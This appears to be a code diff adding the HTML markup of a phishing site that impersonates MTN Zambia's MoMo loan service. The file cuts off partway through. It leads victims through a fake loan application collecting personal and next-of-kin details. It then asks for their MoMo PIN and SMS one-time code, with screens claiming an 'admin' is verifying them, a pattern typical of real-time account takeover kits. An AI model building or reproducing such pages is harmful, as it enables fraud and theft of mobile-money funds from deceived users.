@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN Zambia – Easy Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- PAGE 1: LANDING -->
+    <div id="page-landing" class="page active">
+        <header class="app-header">
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="land-center">
+            <div class="land-card">
+                <h1 data-i18n="welcome">Welcome to MTN Zambia</h1>
+                <p class="land-tagline" data-i18n="tagline">Fast, easy loans through MTN MoMo</p>
+                <div class="calc-box">
+                    <h2 data-i18n="calculator">Loan Calculator</h2>
+                    <div class="calc-row2"><span data-i18n="amount">Amount</span><span class="cv" id="calcAmt">500 ZMW</span></div>
+                    <div class="calc-row2"><span data-i18n="term">Term</span><span class="cv" id="calcTerm">30 Days</span></div>
+                    <input type="range" id="amtSlider" min="500" max="10000" step="100" value="500" oninput="updateCalc()" />
+                    <div class="range-ends"><span>500 ZMW</span><span>10,000 ZMW</span></div>
+                    <div class="monthly-box"><span class="ml" data-i18n="monthly">Monthly Payment</span><span class="ma" id="monthlyAmt">525 ZMW</span></div>
+                </div>
+                <button class="btn-grad" onclick="startApplication()" data-i18n="start">START APPLICATION</button>
+            </div>
+        </div>
+        <div class="land-footer" data-i18n="footer">© 2026 MTN Zambia – Easy Loans</div>
+    </div>
+
+    <!-- PAGE 2: STEP 1 -->
+    <div id="page-step1" class="page">
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-landing')">←</a>
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="step-center">
+            <div class="step-card">
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step1_sub">Step 1 of 4</p>
+                <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label data-i18n="loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="personal">Personal Loan</option><option selected data-i18n="business">Business Loan</option><option data-i18n="home">Home Loan</option><option data-i18n="student">Student Loan</option></select></div></div>
+                <div class="field"><label data-i18n="loan_amount">Amount (ZMW)</label><input type="number" id="s1am" value="500" placeholder="Amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label data-i18n="loan_term">Term</label><div class="sel-wrap"><select id="s1te"><option data-i18n="d30">30 Days</option><option data-i18n="d60">60 Days</option><option data-i18n="d90">90 Days</option></select></div></div>
+                <div class="field"><label data-i18n="purpose">Purpose</label><textarea id="s1pu" placeholder="Describe the purpose of your loan..." oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()" data-i18n="next">NEXT STEP</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 3: STEP 2 -->
+    <div id="page-step2" class="page">
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-step1')">←</a>
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="step-center">
+            <div class="step-card">
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step2_sub">Step 2 of 4</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label data-i18n="first_name">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label data-i18n="last_name">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label data-i18n="phone_label">Phone Number (Zambia)</label>
+                    <div class="phone-row"><div class="ph-pre">+260</div><input type="tel" id="s2ph" placeholder="9X XXX XXXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint" data-i18n="phone_hint">9 digits without +260 prefix (e.g., 971234567)</div>
+                </div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')" data-i18n="back">BACK</button><button class="btn-grad" onclick="toS3()" data-i18n="next">NEXT STEP</button></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 4: STEP 3 -->
+    <div id="page-step3" class="page">
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-step2')">←</a>
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="step-center">
+            <div class="step-card">
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step3_sub">Step 3 of 4</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label data-i18n="employment">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="employed">Employed</option><option selected data-i18n="self_employed">Self-employed</option><option data-i18n="unemployed">Unemployed</option><option data-i18n="retired">Retired</option></select></div></div>
+                <div class="field"><label data-i18n="annual_income">Annual Income (ZMW)</label><input type="number" id="s3in" placeholder="Annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label data-i18n="kin_name">Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label data-i18n="kin_phone">Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+260 9X XXX XXXX" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3 data-i18n="summary">Application Summary</h3>
+                    <div class="sum-row"><span class="sk" data-i18n="loan_amount">Amount:</span><span class="sv" id="sA">500 ZMW</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="loan_term">Term:</span><span class="sv" id="sT">30 Days</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')" data-i18n="back">BACK</button><button class="btn-grad" onclick="submitApp()" data-i18n="submit">SUBMIT APPLICATION</button></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 5: PROCESSING -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2 data-i18n="processing">Processing Application...</h2>
+                <p data-i18n="processing_sub">Please wait while we process your application</p>
+                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="awaiting">⏳ Awaiting admin approval...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 6: PIN (6 DIGITS) -->
+    <div id="page-pin" class="page">
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-processing')">←</a>
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="step-center">
+            <div class="step-card">
+                <h2 data-i18n="enter_pin">Enter MTN MoMo PIN</h2>
+                <p class="step-sub" data-i18n="pin_step_sub">Final verification step</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+                <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
+                <div class="pin-label" data-i18n="pin_label">Enter your MTN MoMo PIN (6 digits):</div>
+                <div id="pinAttemptsDisplay" class="pin-attempts">🔑 Attempts remaining: 3 of 3</div>
+                <div class="pin-row">
+                    <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
+                    <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" />
+                    <input type="password" id="pin2" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" placeholder="•" />
+                    <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" />
+                    <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" />
+                    <input type="password" id="pin5" class="pin-box" maxlength="1" oninput="pinMvM(this,5)" placeholder="•" />
+                    <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
+                    <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
+                </div>
+                <button class="btn-grad" onclick="doPin()" data-i18n="submit_pin">SUBMIT PIN</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 7: WAIT PIN -->
+    <div id="page-wait-pin" class="page">
+        <div style="background:linear-gradient(135deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2 data-i18n="verifying_pin">Verifying PIN...</h2>
+                <p data-i18n="verifying_pin_sub">Your PIN has been received. Please wait for admin verification...</p>
+                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="admin_reviewing_pin">⏳ Admin is reviewing your PIN...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:#004F9F;">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 8: OTP (6 DIGITS) -->
+    <div id="page-otp" class="page">
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-wait-pin')">←</a>
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="step-center">
+            <div class="step-card">
+                <h2 data-i18n="enter_otp">Enter OTP Code</h2>
+                <p class="step-sub" data-i18n="otp_sub">6-digit code sent via SMS</p>
+                <div class="otp-section">
+                    <div class="otp-section-title" data-i18n="otp_label">OTP Code (6 digits):</div>
+                    <div style="display: flex; align-items: center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp4" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp5" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+                <button class="btn-grad" onclick="doOtp()" data-i18n="verify_otp">VERIFY & APPROVE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 9: WAIT OTP -->
+    <div id="page-w
